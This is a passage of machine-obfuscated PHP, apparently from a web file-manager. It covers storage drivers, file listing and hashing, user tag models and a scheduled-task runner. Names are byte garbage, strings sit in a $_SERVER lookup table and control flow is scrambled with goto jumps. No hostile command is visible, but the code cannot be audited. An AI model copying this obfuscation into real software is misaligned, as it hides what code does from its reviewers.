@filemtime($EÌİá†ØÎ), $F×ÅËª‹Êğ[1157] => @fileatime($EÌİá†ØÎ), $F×ÅËª‹Êğ[1151] => is_readable($EÌİá†ØÎ), $F×ÅËª‹Êğ[1152] => is_writable($EÌİá†ØÎ), $F×ÅËª‹Êğ[1158] => get_mode($EÌİá†ØÎ)); return $b•åâ¢‘; } private function fileInfo($fººÑ²¬ªë, $B¢ŠêœæĞÎ = false) { $Dˆ×¥ÍŞ” =& $_SERVER[¢à]; $CäÉÒßÍÒ‰ = $this->iconvApp($this->pathThis($fººÑ²¬ªë)); if ($B¢ŠêœæĞÎ) { return array($Dˆ×¥ÍŞ”[28] => $CäÉÒßÍÒ‰, $Dˆ×¥ÍŞ”[75] => $this->getPathOuter($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[29] => $Dˆ×¥ÍŞ”[164], $Dˆ×¥ÍŞ”[77] => $this->size($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[157] => $this->ext($CäÉÒßÍÒ‰)); } $béêŞ…¹ = array($Dˆ×¥ÍŞ”[28] => $CäÉÒßÍÒ‰, $Dˆ×¥ÍŞ”[75] => $this->getPathOuter($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[29] => $Dˆ×¥ÍŞ”[164], $Dˆ×¥ÍŞ”[184] => @filectime($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[107] => @filemtime($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[1157] => @fileatime($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[77] => $this->size($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[157] => $this->ext($CäÉÒßÍÒ‰), $Dˆ×¥ÍŞ”[1151] => is_readable($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[1152] => is_writable($fººÑ²¬ªë), $Dˆ×¥ÍŞ”[1158] => get_mode($fººÑ²¬ªë)); return $béêŞ…¹; } public function exist($EêÓ² î¢) { $EêÓ² î¢ = $this->iconvSystem($EêÓ² î¢); return @file_exists($EêÓ² î¢); } public function isFile($b·”óÌØŒ¬) { $b·”óÌØŒ¬ = $this->iconvSystem($b·”óÌØŒ¬); return @is_file($b·”óÌØŒ¬); } public function isFolder($Aƒ„²íÓÔë) { $Aƒ„²íÓÔë = $this->iconvSystem($Aƒ„²íÓÔë); return @is_dir($Aƒ„²íÓÔë); } public function listPath($B­ãÅñò–†, $Aì³ï‡ÑÂ = false) { goto b©¹Ää¬Âö; C×—ÍéöÑµ: $Eâ°§‚âø– = array($eÔæÚŞò“«[74] => array(), $eÔæÚŞò“«[73] => array()); if (!($F˜àŒàáÅå = @opendir($B­ãÅñò–†))) { return $Eâ°§‚âø–; } while (($a™ƒ™Ã Çç = readdir($F˜àŒàáÅå)) !== !1) { if ($a™ƒ™Ã Çç == $eÔæÚŞò“«[93] || $a™ƒ™Ã Çç == $eÔæÚŞò“«[1154]) { continue; } $AÂë×äİó¢ = $B­ãÅñò–† . $a™ƒ™Ã Çç; if (is_file($AÂë×äİó¢)) { $Eâ°§‚âø–[$eÔæÚŞò“«[73]][] = $this->fileInfo($AÂë×äİó¢, $Aì³ï‡ÑÂ); } else { $Eâ°§‚âø–[$eÔæÚŞò“«[74]][] = $this->folderInfo($AÂë×äİó¢, $Aì³ï‡ÑÂ); } } goto C¾ŞØíÓ; C¾ŞØíÓ: closedir($F˜àŒàáÅå); return $Eâ°§‚âø–; goto aÍè…¸í¯; b©¹Ää¬Âö: $eÔæÚŞò“« =& $_SERVER[¢à]; $B­ãÅñò–† = $this->iconvSystem($B­ãÅñò–†); $B­ãÅñò–† = rtrim($B­ãÅñò–†, $eÔæÚŞò“«[8]) . $eÔæÚŞò“«[8]; goto C×—ÍéöÑµ; aÍè…¸í¯: } public function listAll($Eœ¹ÆÓ·÷Œ, &$Fæ¢·Éí = array()) { goto e»…ªó×ˆ; dˆ¨ôº÷ìÑ: if (!($e––ªìêÚ = @opendir($Eœ¹ÆÓ·÷Œ))) { return $Fæ¢·Éí; } while (($C°õ©ÊäÛ = readdir($e––ªìêÚ)) !== !1) { if ($C°õ©ÊäÛ == $cÔ©ßí÷…¸[93] || $C°õ©ÊäÛ == $cÔ©ßí÷…¸[1154]) { continue; } $e˜ò¢ ×Òˆ = $Eœ¹ÆÓ·÷Œ . $C°õ©ÊäÛ; if (is_dir($e˜ò¢ ×Òˆ)) { $Fæ¢·Éí[] = array($cÔ©ßí÷…¸[75] => $e˜ò¢ ×Òˆ . $cÔ©ßí÷…¸[8], $cÔ©ßí÷…¸[76] => 1, $cÔ©ßí÷…¸[77] => 0); $this->listAll($e˜ò¢ ×Òˆ, $Fæ¢·Éí); } else { $Fæ¢·Éí[] = array($cÔ©ßí÷…¸[75] => $e˜ò¢ ×Òˆ, $cÔ©ßí÷…¸[76] => 0, $cÔ©ßí÷…¸[77] => $this->size($e˜ò¢ ×Òˆ)); } } closedir($e––ªìêÚ); goto F¢®Â‘ÁÈ‰; F¢®Â‘ÁÈ‰: return $Fæ¢·Éí; goto AÉ§ÀÕ»ºº; e»…ªó×ˆ: $cÔ©ßí÷…¸ =& $_SERVER[¢à]; $Eœ¹ÆÓ·÷Œ = $this->iconvSystem($Eœ¹ÆÓ·÷Œ); $Eœ¹ÆÓ·÷Œ = rtrim($Eœ¹ÆÓ·÷Œ, $cÔ©ßí÷…¸[8]) . $cÔ©ßí÷…¸[8]; goto dˆ¨ôº÷ìÑ; AÉ§ÀÕ»ºº: } public function has($b‚¶Œù´, $Aã‡Ò‚çäñ = false, $F ‚¬«„½Ó = true) { goto D¦£îáğ­; c‘“ÃÆ›Ïì: return !1; goto f¼ ‰ã½”„; DªÆî¤“ˆ°: if (!($e¡³ôÚßÎ = @opendir($b‚¶Œù´))) { return !1; } $E¤ËÙ‘×± = 0; $b‹®ˆ·ø‚ = 0; goto Bš†– Š†º; Bš†– Š†º: while (($c»°ì˜‹ò¯ = readdir($e¡³ôÚßÎ)) !== !1) { if ($c»°ì˜‹ò¯ == $a®ÆÓ‰àÜ[93] || $c»°ì˜‹ò¯ == $a®ÆÓ‰àÜ[1154]) { continue; } $eºãù‚ë = $b‚¶Œù´ . $c»°ì˜‹ò¯; if ($Aã‡Ò‚çäñ) { if (@is_file($eºãù‚ë)) { $E¤ËÙ‘×±++; } else { $b‹®ˆ·ø‚++; } continue; } if ($F ‚¬«„½Ó) { if (@is_file($eºãù‚ë)) { return !0; } } else { if (@is_dir($eºãù‚ë . $a®ÆÓ‰àÜ[8])) { return !0; } } } closedir($e¡³ôÚßÎ); if ($Aã‡Ò‚çäñ) { return array($a®ÆÓ‰àÜ[188] => $E¤ËÙ‘×±, $a®ÆÓ‰àÜ[189] => $b‹®ˆ·ø‚); } goto c‘“ÃÆ›Ïì; D¦£îáğ­: $a®ÆÓ‰àÜ =& $_SERVER[¢à]; $b‚¶Œù´ = $this->iconvSystem($b‚¶Œù´); $b‚¶Œù´ = rtrim($b‚¶Œù´, $a®ÆÓ‰àÜ[8]) . $a®ÆÓ‰àÜ[8]; goto DªÆî¤“ˆ°; f¼ ‰ã½”„: } public function hashSimple($aß”ŒµÔ) { goto a¯”‘¢Ú›´; eóí¤Ëš¯Ò: if ($aš‘ö¹ˆÌ <= $fÆËëà±Ü * $E’ ‚¯¨Ü„) { return $this->hashMd5($aß”ŒµÔ) . $aš‘ö¹ˆÌ; } $eâÅ½—«½ª = $B²·™’æ…Ò[33]; $DÊ«ŞâŒ¨¼ = intval($aš‘ö¹ˆÌ / $E’ ‚¯¨Ü„); goto BæËÅˆÌš¬; a¯”‘¢Ú›´: $B²·™’æ…Ò =& $_SERVER[¢à]; if (!$aß”ŒµÔ) { return md5($B²·™’æ…Ò[33]); } $aß”ŒµÔ = $this->iconvSystem($aß”ŒµÔ); goto c‰Ôò”©å; D¾¥Ìå¦‡: return md5($eâÅ½—«½ª) . $aš‘ö¹ˆÌ; goto Få›ä‰»ñ™; BæËÅˆÌš¬: $c˜àØ‰ñ¾µ = fopen($aß”ŒµÔ, $B²·™’æ…Ò[1159]); if (!$c˜àØ‰ñ¾µ) { return $eâÅ½—«½ª; } for ($E‹ˆÎá·õÚ = 0; $E‹ˆÎá·õÚ < $E’ ‚¯¨Ü„; $E‹ˆÎá·õÚ++) { fseek($c˜àØ‰ñ¾µ, $DÊ«ŞâŒ¨¼ * $E‹ˆÎá·õÚ); $eâÅ½—«½ª .= fread($c˜àØ‰ñ¾µ, $fÆËëà±Ü); } goto F¤Œ ÌÔ²‘; c‰Ôò”©å: $aš‘ö¹ˆÌ = $this->size($aß”ŒµÔ); $fÆËëà±Ü = 200; $E’ ‚¯¨Ü„ = 50; goto eóí¤Ëš¯Ò; F¤Œ ÌÔ²‘: fseek($c˜àØ‰ñ¾µ, $aš‘ö¹ˆÌ - $fÆËëà±Ü); $eâÅ½—«½ª .= fread($c˜àØ‰ñ¾µ, $fÆËëà±Ü); fclose($c˜àØ‰ñ¾µ); goto D¾¥Ìå¦‡; Få›ä‰»ñ™: } public function getContent($d´ÜÃõë…) { $d´ÜÃõë… = $this->iconvSystem($d´ÜÃõë…); return file_get_contents($d´ÜÃõë…); } public function setContent($C§ô¥¥Ö§, $F›±á‘Ô‹İ = '') { $C§ô¥¥Ö§ = $this->iconvSystem($C§ô¥¥Ö§); @file_put_contents($C§ô¥¥Ö§, $F›±á‘Ô‹İ, LOCK_EX); clearstatcache(); return strlen($F›±á‘Ô‹İ) == filesize($C§ô¥¥Ö§); } public function fileSubstr($a›±Æ‚­¸­, $b„­ôÃÃ¤Ç = 0, $d¸†é»ŒÙª = false) { goto B™ôÍß¿Ò¶; AÅñóè²Å: return $cõÙ²—Ÿ¾; goto A¡°¸°¨‰Á; DÈ¿­À¥ºØ: fseek($d©„§ç—ù, $b„­ôÃÃ¤Ç); $cõÙ²—Ÿ¾ = fread($d©„§ç—ù, $d¸†é»ŒÙª); fclose($d©„§ç—ù); goto AÅñóè²Å; B™ôÍß¿Ò¶: $C»øÖ©®Ç =& $_SERVER[¢à]; $a›±Æ‚­¸­ = $this->iconvSystem($a›±Æ‚­¸­); if ($d¸†é»ŒÙª === !1) { $d¸†é»ŒÙª = $this->size($a›±Æ‚­¸­); } goto FƒÒŸï–Ûí; FƒÒŸï–Ûí: if ($d¸†é»ŒÙª <= 0) { return $C»øÖ©®Ç[33]; } $d©„§ç—ù = fopen($a›±Æ‚­¸­, $C»øÖ©®Ç[1159]); if (!$d©„§ç—ù) { return !1; } goto DÈ¿­À¥ºØ; A¡°¸°¨‰Á: } public function upload($Fö¨†µ£µ, $F¬Ò…¨ÆÃ, $fƒæ¬‹Š“é = false, $BÑÔÇ·ÎÎ— = REPEAT_REPLACE) { $b†‡Í¤å¨ô = $this->copyFile($F¬Ò…¨ÆÃ, $Fö¨†µ£µ); return $b†‡Í¤å¨ô ? $this->getPathOuter($Fö¨†µ£µ) : !1; } public function download($BŠ¬éª§ªç, $d­†–›ÙÍ ) { return $this->iconvSystem($BŠ¬éª§ªç); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DÔï¥İÛ£) { parent::__construct($DÔï¥İÛ£); $this->signatureVersion($_SERVER[¢à][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($a†¤Â™ğ) { parent::__construct($a†¤Â™ğ); $this->signatureVersion($_SERVER[¢à][197]); } public function fileOutLink($CŒ­Ü‡™„) { $E³»å¿í›¬ =& $_SERVER[¢à]; if (substr($CŒ­Ü‡™„, 0, 7) == $E³»å¿í›¬[1104]) { $CŒ­Ü‡™„ = $E³»å¿í›¬[1105] . substr($CŒ­Ü‡™„, 7); } header($E³»å¿í›¬[153] . $CŒ­Ü‡™„); die; } } goto fÍòŠäœÜ™; C“Úù×Á±¥: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($c´ÕçîºÁ˜) { return "\x55\163\145\x72\117\160\x74\151\x6f\156\137{$c´ÕçîºÁ˜}\x5f" . USER_ID; } protected function filterWhere($e×Š†Àİ·‹) { $e×Š†Àİ·‹[$_SERVER[¢à][1412]] = USER_ID; return $e×Š†Àİ·‹; } public function cacheRemoveUser($B‡Íâ‡Úƒª, $d“¢˜Ë»Ç) { return Cache::remove("\125\x73\145\x72\117\160\x74\151\157\x6e\137{$B‡Íâ‡Úƒª}\x5f" . $d“¢˜Ë»Ç); } protected function optionDefault($eÍ¾ÛÀÒÛµ = '') { $d¥ÔÍ¤Ç =& $_SERVER[¢à]; if ($eÍ¾ÛÀÒÛµ == $d¥ÔÍ¤Ç[33]) { return $GLOBALS[$d¥ÔÍ¤Ç[6]][$d¥ÔÍ¤Ç[2500]]; } if ($eÍ¾ÛÀÒÛµ == $d¥ÔÍ¤Ç[2501]) { return $GLOBALS[$d¥ÔÍ¤Ç[6]][$d¥ÔÍ¤Ç[2502]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\x74\x61\147\x4c\151\x73\x74"; public $modelType = "\125\x73\145\162\x4f\160\x74\x69\x6f\x6e"; public $field = array("\156\141\155\x65", "\163\x74\171\154\x65", "\x73\157\162\x74"); public function listData($d”Ì²ïÊƒº = false, $e½Ã‡¶¾½é = "\163\x6f\162\x74", $fá‰”Ù„ŠÑ = false) { return parent::listData($d”Ì²ïÊƒº, $e½Ã‡¶¾½é, $fá‰”Ù„ŠÑ); } public function remove($dµÀ®øæê) { return parent::remove($dµÀ®øæê); } public function add($F†¼•°»±¥, $B‘µÍ…ƒ¯õ = "\154\x61\142\x65\x6c\55\x67\x72\145\171\55\156\157\162\x6d\x61\x6c") { $E¤¢©Æ‚¡¦ =& $_SERVER[¢à]; if ($this->findByName($F†¼•°»±¥)) { return !1; } $c‹‚Ù®µ…« = array($E¤¢©Æ‚¡¦[383] => $F†¼•°»±¥, $E¤¢©Æ‚¡¦[433] => $B‘µÍ…ƒ¯õ, $E¤¢©Æ‚¡¦[2079] => $this->getSort($E¤¢©Æ‚¡¦[243]) + 1); return parent::insert($c‹‚Ù®µ…«); } public function update($fĞïÁÖÄ›, $DØè›†î”) { $c·”ÏĞŒ–à =& $_SERVER[¢à]; $e¼ŒâØ×‰Í = $this->listData($fĞïÁÖÄ›); $B†×º£À½è = $this->findByName($DØè›†î”[$c·”ÏĞŒ–à[28]]); if (!$e¼ŒâØ×‰Í || $B†×º£À½è && $B†×º£À½è[$c·”ÏĞŒ–à[364]] != $e¼ŒâØ×‰Í[$c·”ÏĞŒ–à[364]]) { return !1; } return parent::update($fĞïÁÖÄ›, $DØè›†î”); } public function moveTop($c—áÔ¸‚ß) { $eæîŠ¼Ÿ÷¼ =& $_SERVER[¢à]; $a§»å´“âŠ = parent::listData(); $FĞ Úİ¶„ = $this->getSort($eæîŠ¼Ÿ÷¼[242]); foreach ($a§»å´“âŠ as &$e¥Íìù¥‚) { if ($e¥Íìù¥‚[$eæîŠ¼Ÿ÷¼[364]] == $c—áÔ¸‚ß) { $e¥Íìù¥‚[$eæîŠ¼Ÿ÷¼[2096]] = $FĞ Úİ¶„; continue; } $e¥Íìù¥‚[$eæîŠ¼Ÿ÷¼[2096]] += 1; } return parent::resetData($a§»å´“âŠ); } public function moveBottom($d¦Öğ¼ƒä) { $e¤»‹ºà =& $_SERVER[¢à]; $e¿ÉÓëùí = $this->getSort($e¤»‹ºà[243]) + 1; return parent::update($d¦Öğ¼ƒä, array($e¤»‹ºà[2096] => $e¿ÉÓëùí)); } public function resetSort($eÜ¸šîòŸˆ) { goto E¢ÇÉ…£; E¢ÇÉ…£: $FÕÑ¾¤Îøö =& $_SERVER[¢à]; $e»‡À¦æ‚ = array(); $eÜ¸šîòŸˆ = is_array($eÜ¸šîòŸˆ) ? $eÜ¸šîòŸˆ : array(); goto dåÈ¼š¼åÁ; dåÈ¼š¼åÁ: for ($Aš­ÊÊâ£ = 0; $Aš­ÊÊâ£ < count($eÜ¸šîòŸˆ); $Aš­ÊÊâ£++) { $e»‡À¦æ‚[$eÜ¸šîòŸˆ[$Aš­ÊÊâ£] . $FÕÑ¾¤Îøö[33]] = $Aš­ÊÊâ£ + 1; } $bĞ—ÛÔß Ç = parent::listData(); foreach ($bĞ—ÛÔß Ç as &$f¼éª¨Ğóè) { $B‘í‹…†Ñ = $e»‡À¦æ‚[$f¼éª¨Ğóè[$FÕÑ¾¤Îøö[364]]]; $f¼éª¨Ğóè[$FÕÑ¾¤Îøö[2096]] = $B‘í‹…†Ñ ? $B‘í‹…†Ñ : $f¼éª¨Ğóè[$FÕÑ¾¤Îøö[2096]]; } goto Eœ–Äô¡æØ; Eœ–Äô¡æØ: return parent::resetData($bĞ—ÛÔß Ç); goto E›ÜÎ¹øİ¼; E›ÜÎ¹øİ¼: } private function getSort($Eˆ‹“¹Àé›) { $CöÒ«ÚìÕ =& $_SERVER[¢à]; $aòáÓéóÕÁ = parent::listData(); $E¨ŸÑ¼…ƒĞ = array_to_keyvalue($aòáÓéóÕÁ, $CöÒ«ÚìÕ[33], $CöÒ«ÚìÕ[2096]); if (!$E¨ŸÑ¼…ƒĞ) { $E¨ŸÑ¼…ƒĞ = array(0); } $CÓÍ£¹´Š— = $Eˆ‹“¹Àé› == $CöÒ«ÚìÕ[243] ? max($E¨ŸÑ¼…ƒĞ) : min($E¨ŸÑ¼…ƒĞ); return intval($CÓÍ£¹´Š—); } } goto Dù¹èÚá¤è; Cª•êµÜ“°: class AutoTask { public static function start() { goto a‹ææÇ‡·”; a‹ææÇ‡·”: $B«»ßä’èø =& $_SERVER[¢à]; if (self::valueGet($B«»ßä’èø[689]) != $B«»ßä’èø[83]) { return; } if (self::valueGet($B«»ßä’èø[1376]) == $B«»ßä’èø[83]) { $D–Œ²šæÃí = self::valueGet($B«»ßä’èø[1377]); if (time() - $D–Œ²šæÃí > 3600 * 2) { self::restart(); } return; } goto eŠºÖ‡»´; AØŸÕ¸÷é: while (!0) { self::cacheClear(); if (self::valueGet($B«»ßä’èø[689]) != $B«»ßä’èø[83]) { self::valueSet($B«»ßä’èø[1376], $B«»ßä’èø[464]); self::log($B«»ßä’èø[1380]); die; } self::valueSet($B«»ßä’èø[1376], $B«»ßä’èø[83]); self::valueSet($B«»ßä’èø[1377], time()); self::taskRunAll(); sleep(self::valueGet($B«»ßä’èø[1381])); } goto fµÖ†ÙŒš‰; eŠºÖ‡»´: http_close(); self::valueSet($B«»ßä’èø[1376], $B«»ßä’èø[83]); Hook::bind($B«»ßä’èø[1378], $B«»ßä’èø[1379]); goto AØŸÕ¸÷é; fµÖ†ÙŒš‰: } public static function restart() { $a¡‹Â¦… =& $_SERVER[¢à]; http_close(); self::valueSet($a¡‹Â¦…[689], $a¡‹Â¦…[464]); sleep(self::valueGet($a¡‹Â¦…[1381]) + 5); self::valueSet($a¡‹Â¦…[1376], $a¡‹Â¦…[464]); self::valueSet($a¡‹Â¦…[689], $a¡‹Â¦…[83]); } public static function shutdownEvent() { $FõĞÂç¿—Œ =& $_SERVER[¢à]; self::valueSet($FõĞÂç¿—Œ[1376], $FõĞÂç¿—Œ[464]); self::log($FõĞÂç¿—Œ[1382]); } public static function config($AÌ²‚¤Œ‰Ö, $A¬¾É†òºŞ) { $bêßØ¢Îó† =& $_SERVER[¢à]; $eñƒ¼÷Ïó = 20; $A¬¾É†òºŞ = intval($A¬¾É†òºŞ) <= $eñƒ¼÷Ïó ? $eñƒ¼÷Ïó : intval($A¬¾É†òºŞ); self::valueSet($bêßØ¢Îó†[689], $AÌ²‚¤Œ‰Ö); self::valueSet($bêßØ¢Îó†[1381], $A¬¾É†òºŞ); } private static function taskRunAll() { $FÛ·Ÿ¡ò™„ =& $_SERVER[¢à]; $f…ÏĞÊ×¤© = Model($FÛ·Ÿ¡ò™„[1383])->listData(); $bÆ÷çÚĞ² = count($f…ÏĞÊ×¤©); for ($eÍ…ÕËïîŒ = 0; $eÍ…ÕËïîŒ < $bÆ÷çÚĞ²; $eÍ…ÕËïîŒ++) { $FšÀ½µº‡¥ = $f…ÏĞÊ×¤©[$eÍ…ÕËïîŒ]; if ($FšÀ½µº‡¥[$FÛ·Ÿ¡ò™„[1384]] != $FÛ·Ÿ¡ò™„[83]) { continue; } if (!self::taskTimeCheck($FšÀ½µº‡¥)) { continue; } self::taskRun($FšÀ½µº‡¥); } Hook::trigger($FÛ·Ÿ¡ò™„[1385]); } private static function taskTimeCheck($aš©İğš‹ï) { goto c‰‰ÆÇ‹Ö”; e»êĞÔ‘: $A­˜ÀãäÜ = strtotime($EÒ¾‘Âƒñ[1386] . $cÈíùãÜ¦¬[$EÒ¾‘Âƒñ[1387]] . $EÒ¾‘Âƒñ[1388]) - strtotime($EÒ¾‘Âƒñ[1389]); $Fš”ºˆ–´˜ = time() - strtotime(date($EÒ¾‘Âƒñ[1390]) . $EÒ¾‘Âƒñ[1391]); $E›Áã‰çÄö = $Fš”ºˆ–´˜ >= $A­˜ÀãäÜ && $Fš”ºˆ–´˜ <= $A­˜ÀãäÜ + 3600; goto a´Éêæ§è¢; c‰‰ÆÇ‹Ö”: $EÒ¾‘Âƒñ =& $_SERVER[¢à]; $cÈíùãÜ¦¬ = json_decode($aš©İğš‹ï[$EÒ¾‘Âƒñ[187]], !0); $D–İÖÈ•–Û = intval($aš©İğš‹ï[$EÒ¾‘Âƒñ[1377]]); goto e»êĞÔ‘; a´Éêæ§è¢: switch ($cÈíùãÜ¦¬[$EÒ¾‘Âƒñ[29]]) { case $EÒ¾‘Âƒñ[1392]: if (time() - $D–İÖÈ•–Û < 3600 * 24 * 30) { return !1; } if ($cÈíùãÜ¦¬[$EÒ¾‘Âƒñ[1392]] == date($EÒ¾‘Âƒñ[1393]) && $E›Áã‰çÄö) { return !0; } break; case $EÒ¾‘Âƒñ[1394]: if (time() - $D–İÖÈ•–Û < 3600 * 24 * 7) { return !1; } $B¹Ì×Ú·£œ = date($EÒ¾‘Âƒñ[1395]) == 0 ? 7 : date($EÒ¾‘Âƒñ[1395]); if ($cÈíùãÜ¦¬[$EÒ¾‘Âƒñ[1394]] == $B¹Ì×Ú·£œ && $E›Áã‰çÄö) { return !0; } break; case $EÒ¾‘Âƒñ[1387]: if (time() - $D–İÖÈ•–Û < 3600 * 24) { return !1; } if ($E›Áã‰çÄö) { return !0; } break; case $EÒ¾‘Âƒñ[1396]: if (time() - $D–İÖÈ•–Û >= floatval($cÈíùãÜ¦¬[$EÒ¾‘Âƒñ[1396]]) * 60) { return !0; } break; default: break; } return !1; goto cÀÀœ‰ë¬Ú; cÀÀœ‰ë¬Ú: } public static function taskRun($FÖœÇ±³›«) { goto EÚÁ¦õï¦; f½š©ñóæÕ: $d¯Ô‡â÷Õê = timeFloat(); $eã¾áŒ°–¥ = $dƒÊÉ¬×À[33]; switch ($FÖœÇ±³›«[$dƒÊÉ¬×À[29]]) { case $dƒÊÉ¬×À[292]: $Eñ‚ƒÎ¼îë = url_request($FÖœÇ±³›«[$dƒÊÉ¬×À[1400]], $dƒÊÉ¬×À[213], !1, !1, !1, !1, 5); $eã¾áŒ°–¥ = strlen($Eñ‚ƒÎ¼îë); break; case $dƒÊÉ¬×À[212]: $eã¾áŒ°–¥ = Hook::apply($FÖœÇ±³›«[$dƒÊÉ¬×À[1400]]); default: break; } goto E©§Š’³; EÚÁ¦õï¦: $dƒÊÉ¬×À =& $_SERVER[¢à]; self::log($dƒÊÉ¬×À[1397] . $FÖœÇ±³›«[$dƒÊÉ¬×À[364]] . $dƒÊÉ¬×À[1398] . $FÖœÇ±³›«[$dƒÊÉ¬×À[28]] . $dƒÊÉ¬×À[1399] . $FÖœÇ±³›«[$dƒÊÉ¬×À[1400]]); Model($dƒÊÉ¬×À[1383])->run($FÖœÇ±³›«[$dƒÊÉ¬×À[364]]); goto f½š©ñóæÕ; E©§Š’³: Model($dƒÊÉ¬×À[1401])->add(array($dƒÊÉ¬×À[1402] => $dƒÊÉ¬×À[33], $dƒÊÉ¬×À[1403] => $dƒÊÉ¬×À[464], $dƒÊÉ¬×À[29] => $dƒÊÉ¬×À[1404] . $FÖœÇ±³›«[$dƒÊÉ¬×À[364]], $dƒÊÉ¬×À[1405] => json_encode(array($dƒÊÉ¬×À[28] => $FÖœÇ±³›«[$dƒÊÉ¬×À[28]], $dƒÊÉ¬×À[1406] => timeFloat() - $d¯Ô‡â÷Õê, $dƒÊÉ¬×À[278] => $eã¾áŒ°–¥)))); self::log($dƒÊÉ¬×À[1407] . $FÖœÇ±³›«[$dƒÊÉ¬×À[364]] . $dƒÊÉ¬×À[1408] . $eã¾áŒ°–¥); return !0; goto FÓ÷ÆÏÉñ; FÓ÷ÆÏÉñ: } private static function valueGet($FËÄµÕ†) { $B¹Ëµ†İÊÂ =& $_SERVER[¢à]; $bİ³éîù = $B¹Ëµ†İÊÂ[1409]; $cÜÓ»«¨±¨ = Model($B¹Ëµ†İÊÂ[1410])->get($FËÄµÕ†, $bİ³éîù); if (is_null($cÜÓ»«¨±¨)) { Model($B¹Ëµ†İÊÂ[1410])->set($B¹Ëµ†İÊÂ[1381], 10, $bİ³éîù); Model($B¹Ëµ†İÊÂ[1410])->set($B¹Ëµ†İÊÂ[689], $B¹Ëµ†İÊÂ[83], $bİ³éîù); Model($B¹Ëµ†İÊÂ[1410])->set($B¹Ëµ†İÊÂ[1376], $B¹Ëµ†İÊÂ[464], $bİ³éîù); $cÜÓ»«¨±¨ = Model($B¹Ëµ†İÊÂ[1410])->get($FËÄµÕ†, $bİ³éîù); } return $cÜÓ»«¨±¨; } private static function valueSet($fùùÎ¸Ä½æ, $A…ÀÑ»«) { $b‡ÌÂÎÃõ =& $_SERVER[¢à]; return Model($b‡ÌÂÎÃõ[1410])->set($fùùÎ¸Ä½æ, $A…ÀÑ»«, $b‡ÌÂÎÃõ[1409]); } protected static function log($fãË°…¦¬®) { write_log($fãË°…¦¬®, $_SERVER[¢à][1411]); } private static function cacheClear() { $Eù„Œ¡É¬Œ =& $_SERVER[¢à]; $B´£Ô×å›÷ = Model($Eù„Œ¡É¬Œ[1410])->cacheKey($Eù„Œ¡É¬Œ[1409]); Cache::clearMemory($B´£Ô×å›÷); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($F»ÑÂµ¤ˆ½, $dÏ´¸Î•– = '', $eÅÜ„–†ù = 0, $D’Â¾öƒÛ = '') { goto aå…ÙÔÇ; A½Òİ¤ğ¾È: Hook::trigger($fƒÕŠöÒ—„[1423], $this->task); $this->task[$fƒÕŠöÒ—„[1417]] = timeFloat(); self::valueSet($this->task[$fƒÕŠöÒ—„[364]], $this->task); goto dë±Åš‰; EŒÁŸ¿Ó“: Hook::bind($fƒÕŠöÒ—„[1378], array($this, $fƒÕŠöÒ—„[1420])); Hook::bind($fƒÕŠöÒ—„[1421], array($this, $fƒÕŠöÒ—„[1422])); $this->startAfter(); goto A½Òİ¤ğ¾È; aå…ÙÔÇ: $fƒÕŠöÒ—„ =& $_SERVER[¢à]; if (self::get($F»ÑÂµ¤ˆ½)) { return; } $this->task = array($fƒÕŠöÒ—„[364] => $F»ÑÂµ¤ˆ½, $fƒÕŠöÒ—„[1412] => USER_ID, $fƒÕŠöÒ—„[1317] => $D’Â¾öƒÛ, $fƒÕŠöÒ—„[29] => $dÏ´¸Î•–, $fƒÕŠöÒ—„[976] => $fƒÕŠöÒ—„[33], $fƒÕŠöÒ—„[974] => $eÅÜ„–†ù, $fƒÕŠöÒ—„[986] => 0, $fƒÕŠöÒ—„[1413] => 0, $fƒÕŠöÒ—„[1414] => 0, $fƒÕŠöÒ—„[1415] => timeFloat(), $fƒÕŠöÒ—„[1416] => 0, $fƒÕŠöÒ—„[1417] => 0, $fƒÕŠöÒ—„[1418] => 0, $fƒÕŠöÒ—„[1419] => 0, $fƒÕŠöÒ—„[689] => $fƒÕŠöÒ—„[1376]); goto EŒÁŸ¿Ó“; dë±Åš‰: } public function end() { goto a‰òåëñ‚À; a‰òåëñ‚À: $dÑˆĞ‹ ñ =& $_SERVER[¢à]; if (!$this->task) { return; } if ($this->task[$dÑˆĞ‹ ñ[1417]]) { self::valueSet($this->task[$dÑˆĞ‹ ñ[364]], !1); } goto B™ÎøÂŠ‘Á; E²Í„æË›: Hook::unbind($dÑˆĞ‹ ñ[1421], array($this, $dÑˆĞ‹ ñ[1422])); $this->endAfter(); $this->task = !1; goto D‡ öšÎ¯£; B™ÎøÂŠ‘Á: $dö¥‡ÜÒñë = timeFloat() - $this->task[$dÑˆĞ‹ ñ[1415]]; self::log($dÑˆĞ‹ ñ[1424] . $this->task[$dÑˆĞ‹ ñ[364]] . $dÑˆĞ‹ ñ[1425] . $dö¥‡ÜÒñë . $dÑˆĞ‹ ñ[1426]); Hook::unbind($dÑˆĞ‹ ñ[1378], array($this, $dÑˆĞ‹ ñ[1420])); goto E²Í„æË›; D‡ öšÎ¯£: } public function update($C›Ô½ÔÓ±· = 0) { goto E‘¨ÓÆëí¨; BĞ¯¡¯èˆ½: $EŒ½£²ßçÅ[$fä‰…†äß[689]] = $F†˜Ç¼Àæ… ? $F†˜Ç¼Àæ… : $EŒ½£²ßçÅ[$fä‰…†äß[689]]; $EŒ½£²ßçÅ[$fä‰…†äß[1418]] = $AªÊÏÛ©•ã[$fä‰…†äß[1418]] ? $AªÊÏÛ©•ã[$fä‰…†äß[1418]] : 0; $EŒ½£²ßçÅ[$fä‰…†äß[1417]] = timeFloat(); goto Cê›…„ÌŞº; f¶Ÿ³ŸªËÓ: $AªÊÏÛ©•ã = 